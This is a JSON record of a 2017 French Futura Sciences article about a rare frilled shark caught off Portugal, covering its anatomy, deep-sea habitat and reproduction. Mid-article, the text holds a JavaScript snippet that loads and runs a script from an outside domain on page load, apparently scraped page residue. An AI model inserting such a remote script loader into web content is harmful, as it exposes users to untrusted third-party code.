{"title": "Un requin-lézard rarissime montre son étrange visage", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "16/11/2017", "content": "Au large du Portugal, un bien étrange animal a été pêché par hasard. Le requin-lézard n'est pourtant pas inconnu, mais si rare que les humains ne le voient que quelques fois par siècle. Découvrez ce messager des abysses, qui nous montre notre ignorance des grands fonds océaniques. Une équipe d'océanographes a eu une belle et rare surprise. Ces derniers menaient une étude pour réduire la quantité de «  prises accessoires  », c'est-à-dire quand les filets de  pêche  remontent des  espèces  non commercialisées. Parmi les  poissons  remontés, figurait un curieux requin très allongé, de 1,5 m, sa forme évoquant l' anguille . Ce  sélacien , en effet, n'a pas de nageoire dorsale et ses nageoires anale et pelviennes semblent absentes mais en fait installées à l'extrémité de la queue. Sa large tête s'ouvre par une bouche dont les dents portent trois pointes acérées. L'espèce n'est pas inconnue : c'est  Chlamydoselachus anguineus , le requin-lézard, ou requin frangé, ou encore à collerette, car les fentes branchiales de la première des six paires se rejoignent, créant un repli de peau souple juste derrière la tête. Voir aussi : Le requin fantôme : une étrange chimère abyssale vient d'être découverte Si la nouvelle, diffusée par la chaîne de télévision portugaise  SIC Notícias , a trouvé un écho, c'est que l'animal est extrêmement rare. Les rencontres avec ce  requin  farouche sont précieuses depuis sa description dans les années 1880. On sait qu'il fréquente les grands océans du Globe et qu'il préfère les abysses, entre 500 et 1.500 m mais qu'il nage parfois près des côtes, à plus faible profondeur (ce qui peut étonner). Regardez donc  cette vidéo , diffusée par le parc naturel Awashima, au Japon. Le requin-lézard ( Chlamydoselachus anguineus , Garman, 1884) peut atteindre deux mètres de longueur. Il vit le plus souvent dans les profondeurs abyssales et ressemble à une espèce disparue. Son corps ressemble à une anguille mais il paraît plus raide. © Open Cage, CC by-sa 2.5                               Le requin-lézard, témoin de notre méconnaissance des abysses Ce drôle de requin est présenté comme « archaïque » ou comme un « fossile vivant », des expressions que les biologistes ont en horreur. Sa description a en effet montré qu'il ressemblait à une espèce connue à l'état de fossile et datée de 80 millions d'années, avec des caractères anatomiques retrouvés sur des  sélaciens anciens . Pour autant, les spécimens d'aujourd'hui peuvent différer de cet ancêtre du Crétacé et leurs caractères sont bien adaptés à leur mode de vie actuel. De plus, ils sont  ovovivipares . La femelle donne naissance à des jeunes bien formés, de 22 cm de longueur, après, semble-t-il, une  gestation  de trois ans et demi, deux fois plus longue que celle de l'éléphante. Dans le monde froid des abysses, on vit lentement.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"https://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  De quoi se nourrissent-ils ? De  calmars , pour les requins-lézards observés ou pêchés près des côtes japonaises, mais dans les abysses, on l'ignore. Sa méthode de chasse est également énigmatique. Tout juste suppose-t-on qu'il préfère accélérer brutalement grâce à la puissante musculature de sa queue pour opérer une attaque brève, comme les serpents. La reproduction et nombre de caractéristiques biologiques restent mystérieuses. (Voir, pour les anglophones, le lien en bas de cet article.) Après l'étrange  poisson sans visage  découvert échoué sur une plage au Texas, cette pêche vient nous rappeler, encore une fois, que nous ne connaissons que très imparfaitement le monde des océans. Les biologistes marins ont encore du travail... On remarque aussi que les conséquences de la pêche dans les  abysses  ne peuvent pas être évaluées par les scientifiques. Ce qu'il faut retenir Un requin-lézard a été pêché lors d'une campagne scientifique. Ses caractéristiques le rapprochent de requins qui vivaient au Crétacé. Cela vous intéressera aussi Un terrifiant poisson des profondeurs pour la première fois en vidéo                       Poisson étonnant, voisin de la baudroie, le dragon des abysses utilise un organe lumineux pour attirer ses proies. L'animal est rare et très peu d’images le montrent évoluant dans son milieu naturel. Lors d’une exploration réalisée en 2015, l’institut de recherche de l’aquarium de Monterey Bay a ramené quelques images de cet étrange spécimen, à découvrir en vidéo.                                       ", "theme": "planete"}